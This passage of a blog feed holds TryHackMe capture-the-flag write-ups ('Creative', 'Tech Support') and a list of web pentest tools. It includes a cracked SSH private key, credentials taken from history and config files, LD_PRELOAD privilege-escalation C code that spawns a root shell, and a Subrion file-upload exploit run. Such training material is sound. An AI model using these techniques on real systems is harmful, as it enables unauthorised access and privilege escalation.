1gAlLqjcVeGmzXESqWWI+4rF4dnVuwBcHDskZ8TbKEGueBjMX3FdafP0SAl7+gRQNp3OsW VABMeWJmLDL+reNxAtsPTmDhXuDvoVfITx0V3Bu4UsRJpFl6rJpMgUyjeu3Dff9FjAqQRS qvsCB1lPAmb50y6v2qveOHJav4DbP7KCYRNR5C1W5R74rDUbLusyWFApWxHVpTDdHY6Zba +hmqT+kre2Qsg7fvBG7U8Fqe6jf1jVgSIMyUQ1UoowlmdBoP6/eI6Ce3p6lhqAfECb0mHT Z5tvpxF3QjP6mOPTy1YabeCrsKWoTN821bZUAW0UO5OIGYoQZo5fo6u5g7kj1LmXNG15AU ZAdKt56miOG5g4SsquDNVaJTQg7rsrVW3ghA4kE+BIRGmTuvKt5q4WZDB6gXXzJgEsZ5Kt KbURhk1zzqxKprI+yYTrqmxki1EhS2V6qDlYoVscYnIZK9IDV/1c22nNEkSTWhKzHe+6A7 qWNMkOw9xaIdB8WV/yfCf2nOtAAdAYSl28r7c+WSoucqvVBEWhblTqz1oL+bYeDhqRWusP e+gtkwODGaGQpUl793Eusk6vVYZni5xgOMDuERsREuT2ZsUP20AxVYw/mbUsOjeGpEoCGZ UBwl2LeGGSDZgZJC+DLOj/Rg0uy9gaADI0Nrwz6ushxqFUg1RDV+WzFxIw9uDqFiL0gHwZ FXiQLzmLQZ5X1JtWD2nqZwPnM66q9wOeMstYw8+8mJz5E/lTr80Nsde/eVYs3sY9STF+Ye 421hF21P2RLOYv4UM2aQ2hmfUb9MJ99Rj5UvpY83z4uUYu7Vmq2dMDcFsk7Zg8JdNDMg2O GpgYRcLH44/iPrKRKdtdlVXILLKLjFau8TPzyhKfsa6/3H485Sc/YT94D+bRcx3uL+U003 l7H2rPQ2RDPQeRyLX12uRMcakQLY7zIEyFhH0fMw3rCTcdp/FbkOUEOfXBPkSNWHh7f411 15y/K7bkNDwSi5Ul9yt05uSSEsibJVSfKbvETEFmSQ3tdSVq0PA3ymiBzWixlNOE123KI0 Zs0fwcKpS7h0GzikbIAcrln7ozSgjMzYawbQzEyjjR2QFySMWLGHAW4N7eZ6VfP3dBJxcs fq4rvw54iukm24T9qAnMXuj1+9joNomiScStTV98RmVy8WMs6WW4r0f7ynhN/S/LYHya+<span class="hljs-number">6</span> D2DK4fRX8v5bY9MAsuqlBIUYH0AVUieyDBnP9QsGNnlIm8TS9UuT/gv/<span class="hljs-number">6</span>+sWRpg7H5jkNz 69XRxDuLKV5jVElkEAn/B3bkpkAAcfSfXJphgtYsYbrgchSGtxWMX7FurkWbd0l0WyX//E 8OWhSwGmtO24YBhqQ47nGhDa8ceAJbr0uOIVm+Klfro2D7bPX0Wm2LC65Z6OQGvhrEbQwP nYcg+D3hFL9ZB4GfAZzwbLAP6EYJ+Tq6I/eiJ5LKs6Q32jMfITUy3wcEPkneMwdOkd35Od Fcm9ZL3fa5FhAEdRXJrF8Oe5ZkHsj3nXLYnc2Z2Aqjl6TpMRubuu+qnaOdCnAGu1ghqQlS ksrXEYjaMdndnvxBZ0zi9T+ywag= -----END OPENSSH PRIVATE KEY-----</code></pre><p> Alright so ive been stuck here for the past 30- 40 minutes i even looked at some write-ups and still didn’t understand why it didnt work </p><p>I was always changing <code>chmod 600</code> for the file <code>id_rsa</code> and it was giving me a permission denied public key error:</p><pre><code class="hljs python">Load key <span class="hljs-string">&quot;id_rsa&quot;</span>: Permission deniedsaad@beta.creative.thm: Permission denied (publickey).</code></pre><p>I just found that if we do chmod to 400 it will work:</p><pre><code class="hljs python">└─$ ssh saad@creative.thm -i id_rsaEnter passphrase <span class="hljs-keyword">for</span> key <span class="hljs-string">&#x27;id_rsa&#x27;</span>:</code></pre><p>So the key is protected with a passphrase and we’re going to crack it using <code>john</code> :</p><pre><code class="hljs python">└─$ ssh2john id_rsa &gt; tojohn└─$ john --wordlist=/usr/share/wordlists/rockyou.txt tojohn</code></pre><p>→ output:</p><p><img src="/../Creative_img/11.png" alt="alt text"></p><p>Now we can connect through ssh with the passphrase sweetness:</p><pre><code class="hljs python">└─$ ssh saad@creative.thm -i id_rsa</code></pre><p>→</p><p><img src="/../Creative_img/12.png" alt="alt text"></p><p>User.txt Flag: <code>9a1ce90a7653d74ab98630b47b8b4a84</code></p><h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h1><p>We can try to do sudo -l but in the end it asks for saad’s password which we don’t own.</p><p>We can check bash history, here we have a chance for the credentials to be shown</p><p>→ output:</p><pre><code class="hljs python">saad@m4lware:~$ cat .bash_historywhoamipwdls -allscd ..sudo -lecho <span class="hljs-string">&quot;saad:MyStrongestPasswordYet$4291&quot;</span> &gt; creds.txtrm creds.txtsudo -lwhomaiwhoamipwdls -alsudo -lls -alpwdwhoamimysql -u root -pnetstat -antlpmysql -u rootsudo sussh root@<span class="hljs-number">192.169</span><span class="hljs-number">.155</span><span class="hljs-number">.104</span>mysql -u user -pmysql -u db_user -pls -ld /var/lib/mysqlls -alcat .bash_history cat .bash_logout nano .bashrc ls -al</code></pre><p>BINGO we found the user and pass </p><pre><code class="hljs python">saad:MyStrongestPasswordYet$<span class="hljs-number">4291</span></code></pre><p>The <code>sudo -l</code> command lists the permitted (and forbidden) commands for the invoking user, helping to identify potential privilege escalation vectors on a Linux system during a penetration test.</p><p>→ sudo -l output</p><pre><code class="hljs python">Matching Defaults entries <span class="hljs-keyword">for</span> saad on m4lware:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/<span class="hljs-built_in">bin</span>\:/usr/sbin\:/usr/<span class="hljs-built_in">bin</span>\:/sbin\:/<span class="hljs-built_in">bin</span>\:/snap/<span class="hljs-built_in">bin</span>, env_keep+=LD_PRELOADUser saad may run the following commands on m4lware:    (root) /usr/<span class="hljs-built_in">bin</span>/ping</code></pre><p>With ping we can’t really escalate the privileges but we find something that might be interesting:</p><pre><code class="hljs python">env_keep+=LD_PRELOAD</code></pre><p>We searched on google about LD_PRELOAD privilege escalation and we got this:</p><p><a href="https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/">https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/</a></p><p>In this article we learn how to take advantage of this and escalate privileges(get root access)</p><p>We are going to create a C-program in &#x2F;tmp</p><p>→</p><pre><code class="hljs python"><span class="hljs-comment">#include &lt;stdio.h&gt;</span><span class="hljs-comment">#include &lt;sys/types.h&gt;</span><span class="hljs-comment">#include &lt;stdlib.h&gt;</span>void _init() &#123;unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);setgid(<span class="hljs-number">0</span>);setuid(<span class="hljs-number">0</span>);system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);&#125;</code></pre><p>Save it as <strong>shell.c</strong></p><p>Now we are going to run these commands but instead of <code>find</code> we are going to use <code>ping</code> because that’s where we have permissions:</p><pre><code class="hljs python">gcc -fPIC -shared -o shell.so shell.c -nostartfilesls -al shell.sosudo LD_PRELOAD=/tmp/shell.so find</code></pre><p><img src="/../Creative_img/13.png" alt="alt text"></p><p>Root Flag:</p><pre><code class="hljs python"><span class="hljs-comment"># cat root.txt</span>992bfd94b90da48634aed182aae7b99f</code></pre><p>Root.txt Flag: <code>992bfd94b90da48634aed182aae7b99f</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> TryHackMe </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web Penetration Testing tools</title>
      <link href="/2024/07/19/Web-Penetration-Testing-tools/"/>
      <url>/2024/07/19/Web-Penetration-Testing-tools/</url>
      
        <content type="html"><![CDATA[<p><img src="/../cheatsheet_img/red-team-fundamentals.png" alt="alt text"></p><p><strong>In this guide ill be sharing the most common and usefull tools i use in each step of a Web Penetration Testing</strong></p><h1 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h1><p>In this phase i do a lot of manual searching including OSINT Methods like <strong>Google Dorking</strong></p><h2 id="Automated-Recon-Tools"><a href="#Automated-Recon-Tools" class="headerlink" title="Automated Recon Tools"></a><strong>Automated Recon Tools</strong></h2><p><strong>→ Shodan</strong></p><ul><li>A search engine for internet-connected devices, allowing the discovery of exposed services and devices online.</li></ul><p><strong>→ theHarvester</strong></p><ul><li>A tool for gathering email addresses, subdomains, IPs, and URLs by leveraging multiple search engines.</li></ul><h2 id="Manual-Reconnaissance-Tools"><a href="#Manual-Reconnaissance-Tools" class="headerlink" title="Manual Reconnaissance Tools"></a>Manual Reconnaissance Tools</h2><p><strong>→ BurpSuite</strong></p><ul><li>A web application security testing suite with tools for performing dynamic analysis and finding security weaknesses in web applications.</li></ul><p><strong>→  WHOIS</strong></p><ul><li>Manually query WHOIS databases to gather information about domain ownership, registration dates, and contact details.</li></ul><p><strong>→ Nslookup</strong></p><ul><li>Manually perform DNS queries to gather information about IP addresses, domain names, and DNS records.</li></ul><p><strong>→ Dig</strong></p><ul><li>A command-line tool for querying DNS name servers.</li></ul><p><strong>→ Dnsenum</strong></p><ul><li>Manually query DNS servers to collect information about domains, IP addresses, and subdomains associated with a target.</li></ul><h2 id="DNS-Subdomains"><a href="#DNS-Subdomains" class="headerlink" title="DNS &amp; Subdomains"></a>DNS &amp; Subdomains</h2><p><strong>→ Fierce</strong></p><ul><li>Fierce is a DNS reconnaissance tool for locating non-contiguous IP space and hostnames. It is designed to find and map the network of a target domain.</li></ul><p><strong>→ Sublist3r</strong></p><ul><li>Sublist3r is a Python tool designed to enumerate subdomains of websites using search engines. It integrates with various search engines like Google, Bing, Yahoo, Baidu, and others to gather subdomains.</li></ul><p><strong>→ Dnsenum</strong></p><ul><li>Manually query DNS servers to collect information about domains, IP addresses, and subdomains associated with a target.</li></ul><p><strong>→ wfuzz</strong></p><ul><li>wfuzz is a tool that can be used for mainly for directory busting, bruteforce but it ccan also do subdomain enumeration.</li></ul><h1 id="Scanning"><a href="#Scanning" class="headerlink" title="Scanning"></a>Scanning</h1><p><strong>→ Nmap</strong></p><ul><li>A powerful network discovery and security auditing tool used to scan networks and hosts for open ports and services.</li></ul><p><strong>→ Nikto</strong></p><p>A web server scanner that identifies potentially harmful files, outdated server components, and security vulnerabilities.</p><p><strong>→ Nuclei</strong></p><ul><li><strong>Nuclei</strong> is a fast, customizable tool designed for vulnerability scanning and security automation, capable of performing comprehensive scans using predefined templates.</li></ul><h2 id="Directory-Busting"><a href="#Directory-Busting" class="headerlink" title="Directory Busting"></a>Directory Busting</h2><p><strong>→ Gobuster</strong></p><ul><li>A Go-based tool used to brute-force URLs (directories and files) and DNS subdomains, known for its speed and efficiency.</li></ul><p><strong>→ DirBuster</strong></p><ul><li>A multi-threaded Java application designed to brute-force directories and files on web&#x2F;application servers.</li></ul><p><strong>→ WFuzz</strong></p><ul><li>WFuzz is a flexible tool for brute-forcing web applications. It is used to discover hidden resources like directories, files, and parameters by iterating over wordlists.</li></ul><p><strong>→ ffuf (Fuzz Faster U Fool)</strong></p><ul><li>ffuf is a fast web fuzzer written in Go. It is used for directory and file discovery, parameter fuzzing, and more. Its speed and efficiency make it a popular choice for penetration testers.</li></ul><h1 id="Vulnerability-Assessment"><a href="#Vulnerability-Assessment" class="headerlink" title="Vulnerability Assessment"></a>Vulnerability Assessment</h1><p><strong>→ Burp Suite</strong></p><ul><li><p>Burp Suite is a comprehensive tool for web application security testing. It includes features for crawling web applications, finding vulnerabilities, and automating repetitive tasks.</p><p>  <img src="/../cheatsheet_img/1*NT5nvK-S6lm26cIls-aBDQ.png" alt="alt text"></p></li></ul><p><strong>→ OWASP ZAP (Zed Attack Proxy)</strong></p><ul><li><p>OWASP ZAP is an open-source tool that helps find security vulnerabilities in web applications. It provides automated scanners as well as various tools for manual testing.</p><p>  <img src="/../cheatsheet_img/OWASP-ZAP-1.png.webp" alt="alt text"></p></li></ul><h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><p><strong>→ Metasploit</strong></p><ul><li>A widely-used exploitation framework that provides tools for developing, testing, and executing exploit code against a remote target.</li></ul><p><strong>→ SQLMap</strong></p><ul><li><p>SQLMap automates the detection and exploitation of SQL injection vulnerabilities. It supports a wide range of database management systems and provides various techniques for injecting SQL commands.</p><p>  <img src="/../cheatsheet_img/523723e4d3b75b6439b8e2cd0fa6880b.png" alt="alt text"></p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tech Support</title>
      <link href="/2024/07/19/Tech-Support/"/>
      <url>/2024/07/19/Tech-Support/</url>
      
        <content type="html"><![CDATA[<p><img src="/../Techsupport_img/1*HxMde2gkALloIVqTSDzNug.png" alt="alt text"></p><h1 id="Tech-Support"><a href="#Tech-Support" class="headerlink" title="Tech Support"></a>Tech Support</h1><p>Machine IP Address: 10.10.182.207</p><h1 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h1><h2 id="NMAP-Scanning"><a href="#NMAP-Scanning" class="headerlink" title="NMAP Scanning"></a>NMAP Scanning</h2><ul><li>command used: (scanning for all ports fast and efficient)</li></ul><pre><code class="hljs bash">sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -Pn 10.10.182.207</code></pre><p>→ output:</p><pre><code class="hljs bash">PORT    STATE SERVICE      REASON22/tcp  open  ssh          syn-ack ttl 6380/tcp  open  http         syn-ack ttl 63139/tcp open  netbios-ssn  syn-ack ttl 63445/tcp open  microsoft-ds syn-ack ttl 63</code></pre><p>Full NMAP Scanning:(scanning the ports we got)</p><pre><code class="hljs bash">PORT    STATE SERVICE     VERSION22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 10:8a:f5:72:d7:f9:7e:14:a5:c5:4f:9e:97:8b:3d:58 (RSA)|   256 7f:10:f5:57:41:3c:71:db:b5:5b:db:75:c9:76:30:5c (ECDSA)|_  256 6b:4c:23:50:6f:36:00:7c:a6:7c:11:73:c1:a8:60:0c (ED25519)80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It works139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)Service Info: Host: TECHSUPPORT; OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:| smb-os-discovery: |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)|   Computer name: techsupport|   NetBIOS computer name: TECHSUPPORT\x00|   Domain name: \x00|   FQDN: techsupport|_  System time: 2024-07-18T12:04:49+05:30|_clock-skew: mean: -1h49m59s, deviation: 3h10m30s, median: 0s| smb-security-mode: |   account_used: guest|   authentication_level: user|   challenge_response: supported|_  message_signing: disabled (dangerous, but default)| smb2-time: |   <span class="hljs-built_in">date</span>: 2024-07-18T06:34:49|_  start_date: N/A| smb2-security-mode: |   3:1:1: |_    Message signing enabled but not required</code></pre><h2 id="Services"><a href="#Services" class="headerlink" title="Services"></a>Services</h2><h3 id="TCP-22-Default-Port-for-ssh"><a href="#TCP-22-Default-Port-for-ssh" class="headerlink" title="TCP 22 (Default Port for ssh)"></a>TCP 22 (Default Port for ssh)</h3><p>-&gt; SSH package version - Might be able to find the OS and version.</p><p>-&gt; SSH key fingerprint - Has the key been re-used somewhere (Another machine? Same machine, just another port&#x2F;service?)</p><p>-&gt; SSH banner - Any text (if at all) before the password prompt (often get legal warnings about connecting to it)</p><ul><li>SSH package version:</li></ul><pre><code class="hljs bash">nc -vn 10.10.182.207 22</code></pre><p>→ output:</p><pre><code class="hljs bash">(UNKNOWN) [10.10.182.207] 22 (ssh) openSSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.10</code></pre><p>-&gt; SSH key fingerprint:</p><pre><code class="hljs bash">ssh root@10.10.182.207</code></pre><ul><li>output:</li></ul><pre><code class="hljs bash">└─$ ssh root@10.10.182.207The authenticity of host <span class="hljs-string">&#x27;10.10.182.207 (10.10.182.207)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><span class="hljs-string">ED25519 key fingerprint is SHA256:J/HR9GKX4ReRvs4I9fnMwmJrOTL5B3skZ4owxwxWoyM.</span><span class="hljs-string">This key is not known by any other names.</span><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])?</span></code></pre><h3 id="TCP-80-Default-Port-for-HTTP"><a href="#TCP-80-Default-Port-for-HTTP" class="headerlink" title="TCP 80 (Default Port for HTTP)"></a>TCP 80 (Default Port for HTTP)</h3><ul><li><blockquote><p>Web Server:</p></blockquote></li></ul><pre><code class="hljs bash">curl -i http://10.10.182.207 | <span class="hljs-built_in">head</span> -n 50</code></pre><p>→ output:</p><pre><code class="hljs bash">└─$ curl -i http://10.10.182.207 | <span class="hljs-built_in">head</span> -n 50  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed100 11321  100 11321    0     0  84875      0 --:--:-- --:--:-- --:--:-- 85120HTTP/1.1 200 OKDate: Thu, 18 Jul 2024 06:39:57 GMTServer: Apache/2.4.18 (Ubuntu)Last-Modified: Fri, 28 May 2021 18:22:10 GMTETag: <span class="hljs-string">&quot;2c39-5c367f4428b1f&quot;</span>Accept-Ranges: bytesContent-Length: 11321Vary: Accept-EncodingContent-Type: text/html&lt;!DOCTYPE html PUBLIC <span class="hljs-string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span> <span class="hljs-string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;&lt;html xmlns=<span class="hljs-string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;  &lt;!--    Modified from the Debian original <span class="hljs-keyword">for</span> Ubuntu    Last updated: 2014-03-19    See: https://launchpad.net/bugs/1288690  --&gt;  &lt;<span class="hljs-built_in">head</span>&gt;    &lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span> /&gt;    &lt;title&gt;Apache2 Ubuntu Default Page: It works&lt;/title&gt;    &lt;style <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> media=<span class="hljs-string">&quot;screen&quot;</span>&gt;  * &#123;    margin: 0px 0px 0px 0px;    padding: 0px 0px 0px 0px;  &#125;  body, html &#123;    padding: 3px 3px 3px 3px;    background-color: <span class="hljs-comment">#D8DBE2;</span>    font-family: Verdana, sans-serif;    font-size: 11pt;    text-align: center;  &#125;  div.main_page &#123;    position: relative;    display: table;    width: 800px;    margin-bottom: 3px;    margin-left: auto;    margin-right: auto;    padding: 0px 0px 0px 0px;    border-width: 2px;    border-color: <span class="hljs-comment">#212738;</span></code></pre><h2 id="Directory-Busting"><a href="#Directory-Busting" class="headerlink" title="Directory Busting"></a>Directory Busting</h2><p>Directory busting with gobuster</p><ul><li>command used:</li></ul><pre><code class="hljs bash">└─$ gobuster <span class="hljs-built_in">dir</span> -u http://10.10.182.207 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</code></pre><p>→ output:</p><pre><code class="hljs bash">└─$ gobuster <span class="hljs-built_in">dir</span> -u http://10.10.182.207 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt===============================================================Gobuster v3.6by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url:                     http://10.10.182.207[+] Method:                  GET[+] Threads:                 10[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt[+] Negative Status codes:   404[+] User Agent:              gobuster/3.6[+] Timeout:                 10s===============================================================Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode===============================================================/wordpress            (Status: 301) [Size: 318] [--&gt; http://10.10.182.207/wordpress/]/test                 (Status: 301) [Size: 313] [--&gt; http://10.10.182.207/test/]</code></pre><p>We got 2 directories but they seem like a rabbit hole so let’s not waste time on this </p><h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p><strong>Let’s check smb</strong> </p><ul><li>command used:</li></ul><pre><code class="hljs bash">smbclient -L 10.10.182.207</code></pre><p>→ output:</p><pre><code class="hljs bash">Password <span class="hljs-keyword">for</span> [WORKGROUP\kali]:        Sharename       Type      Comment        ---------       ----      -------        <span class="hljs-built_in">print</span>$          Disk      Printer Drivers        websvr          Disk              IPC$            IPC       IPC Service (TechSupport server (Samba, Ubuntu))Reconnecting with SMB1 <span class="hljs-keyword">for</span> workgroup listing.        Server               Comment        ---------            -------        Workgroup            Master        ---------            -------        WORKGROUP</code></pre><p>We found <code>websvr</code> so let’s check that:</p><ul><li>command used:</li></ul><pre><code class="hljs bash">smbclient //10.10.182.207/websvr</code></pre><p>→ output: (we found a file <code>enter.txt</code>  so let’s download it)</p><pre><code class="hljs bash">└─$ smbclient  //10.10.182.207/websvr Password <span class="hljs-keyword">for</span> [WORKGROUP\kali]:Try <span class="hljs-string">&quot;help&quot;</span> to get a list of possible commands.smb: \&gt; <span class="hljs-built_in">ls</span>  .                                   D        0  Sat May 29 03:17:38 2021  ..                                  D        0  Sat May 29 03:03:47 2021  enter.txt                           N      273  Sat May 29 03:17:38 2021                8460484 blocks of size 1024. 5697732 blocks availablesmb: \&gt; get enter.txtgetting file \enter.txt of size 273 as enter.txt (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)smb: \&gt; <span class="hljs-built_in">exit</span></code></pre><p>Found some credentials and some instructions</p><pre><code class="hljs bash">─$ <span class="hljs-built_in">cat</span> enter.txt                            GOALS=====1)Make fake popup and host it online on Digital Ocean server2)Fix subrion site, /subrion doesn<span class="hljs-string">&#x27;t work, edit from panel</span><span class="hljs-string">3)Edit wordpress website</span><span class="hljs-string"></span><span class="hljs-string">IMP</span><span class="hljs-string">===</span><span class="hljs-string">Subrion creds</span><span class="hljs-string">|-&gt;admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk [cooked with magical formula]</span><span class="hljs-string">Wordpress creds</span><span class="hljs-string">|-&gt;</span><span class="hljs-string"></span></code></pre><p>Decode the password on <code>cyberchef</code> :</p><p><img src="/../Techsupport_img/Screenshot%202024-07-19%20at%2000.03.14.png" alt="alt text"></p><p>Pass: Scam2021</p><p>Now we go into &#x2F;subrion&#x2F;panel as the instruction said and log in</p><p>Subrion is a open source CMS based on php and MySQL and there are many exploits.</p><p>→ After some research we found a exploit (Arbitrary File Upload), with this we are going to get a reverse shell.</p><pre><code class="hljs bash">└─$ searchsploit Subrion             ------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title                                                                                                                                         |  Path------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Subrion 3.x - Multiple Vulnerabilities                                                                                                                 | php/webapps/38525.txtSubrion 4.2.1 - <span class="hljs-string">&#x27;Email&#x27;</span> Persistant Cross-Site Scripting                                                                                                | php/webapps/47469.txtSubrion Auto Classifieds - Persistent Cross-Site Scripting                                                                                             | php/webapps/14391.txtSUBRION CMS - Multiple Vulnerabilities                                                                                                                 | php/webapps/17390.txtSubrion CMS 2.2.1 - Cross-Site Request Forgery (Add Admin)                                                                                             | php/webapps/21267.txtsubrion CMS 2.2.1 - Multiple Vulnerabilities                                                                                                           | php/webapps/22159.txtSubrion CMS 4.0.5 - Cross-Site Request Forgery (Add Admin)                                                                                             | php/webapps/47851.txtSubrion CMS 4.0.5 - Cross-Site Request Forgery Bypass / Persistent Cross-Site Scripting                                                                | php/webapps/40553.txtSubrion CMS 4.0.5 - SQL Injection                                                                                                                      | php/webapps/40202.txtSubrion CMS 4.2.1 - <span class="hljs-string">&#x27;avatar[path]&#x27;</span> XSS                                                                                                                 | php/webapps/49346.txtSubrion CMS 4.2.1 - Arbitrary File Upload                                                                                                              | php/webapps/49876.pySubrion CMS 4.2.1 - Cross Site Request Forgery (CSRF) (Add Amin)                                                                                       | php/webapps/50737.txtSubrion CMS 4.2.1 - Cross-Site Scripting                                                                                                               | php/webapps/45150.txtSubrion CMS 4.2.1 - Stored Cross-Site Scripting (XSS)</code></pre><ul><li>command used:</li></ul><pre><code class="hljs bash">└─$ python3 49876.py -u http://10.10.58.255/subrion/panel/ -l admin -p Scam2021</code></pre><p><img src="/../Techsupport_img/Screenshot%202024-07-19%20at%2000.03.23.png" alt="alt text"></p><h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h1><p><strong>Check &#x2F;etc&#x2F;passwd:</strong></p><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/passwd</code></pre><p>Found the user <strong><code>scamsite</code></strong> </p><pre><code class="hljs bash">scamsite:x:1000:1000:scammer,,,:/home/scamsite:/bin/bash</code></pre><p>From the note with the instructions we move into the website’s directory</p><pre><code class="hljs bash">1)Make fake popup and host it online on Digital Ocean server2)Fix subrion site, /subrion doesn<span class="hljs-string">&#x27;t work, edit from panel</span><span class="hljs-string">3)Edit wordpress website</span></code></pre><pre><code class="hljs bash">$ <span class="hljs-built_in">ls</span> -la /var/www/html/wordpress/ total 220drwxr-xr-x  5 www-data www-data  4096 May 29  2021 .drwxr-xr-x  5 root     root      4096 May 29  2021 ..-rw-r--r--  1 www-data www-data   543 May 29  2021 .htaccess-rwxr-xr-x  1 www-data www-data   405 Feb  6  2020 index.php-rwxr-xr-x  1 www-data www-data 19915 Jan  1  2021 license.txt-rwxr-xr-x  1 www-data www-data  7345 Dec 30  2020 readme.html-rwxr-xr-x  1 www-data www-data  7165 Jan 21  2021 wp-activate.phpdrwxr-xr-x  9 www-data www-data  4096 May 13  2021 wp-admin-rwxr-xr-x  1 www-data www-data   351 Feb  6  2020 wp-blog-header.php-rwxr-xr-x  1 www-data www-data  2328 Feb 17  2021 wp-comments-post.php-rwxr-xr-x  1 www-data www-data  2992 May 29  2021 wp-config.phpdrwxr-xr-x  6 www-data www-data  4096 May 29  2021 wp-content-rwxr-xr-x  1 www-data www-data  3939 Jul 31  2020 wp-cron.phpdrwxr-xr-x 25 www-data www-data 12288 May 13  2021 wp-includes-rwxr-xr-x  1 www-data www-data  2496 Feb  6  2020 wp-links-opml.php-rwxr-xr-x  1 www-data www-data  3313 Jan 11  2021 wp-load.php-rwxr-xr-x  1 www-data www-data 44994 Apr  5  2021 wp-login.php-rwxr-xr-x  1 www-data www-data  8509 Apr 14  2020 wp-mail.php-rwxr-xr-x  1 www-data www-data 21125 Feb  2  2021 wp-settings.php-rwxr-xr-x  1 www-data www-data 31328 Jan 28  2021 wp-signup.php-rwxr-xr-x  1 www-data www-data  4747 Oct  9  2020 wp-trackback.php-rwxr-xr-x  1 www-data www-data  3236 Jun  9  2020 xmlrpc.php</code></pre><p>After doing some enumeration here we find a password in wp-config.php</p><pre><code class="hljs bash">/** MySQL database username */define( <span class="hljs-string">&#x27;DB_USER&#x27;</span>, <span class="hljs-string">&#x27;support&#x27;</span> );/** MySQL database password */define( <span class="hljs-string">&#x27;DB_PASSWORD&#x27;</span>, <span class="hljs-string">&#x27;ImAScammerLOL!123!&#x27;</span> )</code></pre><p><strong>Log in with ssh as scamsite</strong> </p><pre><code class="hljs bash">└─$ ssh scamsite@10.10.58.255</code></pre><p><img src="/../Techsupport_img/Screenshot%202024-07-19%20at%2000.03.32.png" alt="alt text"></p><p><strong>Check sudo permissions sudo -l</strong> </p><pre><code class="hljs bash">scamsite@TechSupport:~/websvr$ sudo -lMatching Defaults entries <span class="hljs-keyword">for</span> scamsite on TechSupport:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser scamsite may run the following commands on TechSupport:    (ALL) NOPASSWD: /usr/bin/iconv</code></pre><pre><code class="hljs plaintext">(ALL) NOPASSWD: /usr/bin/iconv</code></pre><h1 id="GTFOBins"><a href="#GTFOBins" class="headerlink" title="GTFOBins"></a>GTFOBins</h1><p>We found that sudo can run <code>iconv</code> luckily we found that on gtfobins:</p><p><img src="/../Techsupport_img/Screenshot%202024-07-19%20at%2000.03.40.png" alt="alt text"></p><p><img src="/../Techsupport_img/Screenshot%202024-07-19%20at%2000.03.46.png" alt="alt text"></p><p><strong>Now we can read the root.txt flag using this command :</strong></p><pre><code class="hljs bash">scamsite@TechSupport:~$ sudo iconv -f 8859_1 -t 8859_1 <span class="hljs-string">&quot;/root/root.txt&quot;</span></code></pre><p><img src="/../Techsupport_img/Screenshot%202024-07-19%20at%2000.03.53.png" alt="alt text"></p>]]></content>
      
      
      
        <tags>
            
            <tag> TryHackMe </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Publisher</title>
      <link href="/2024/07/18/Publisher/"/>
      <url>/2024/07/18/Publisher/</url>
      
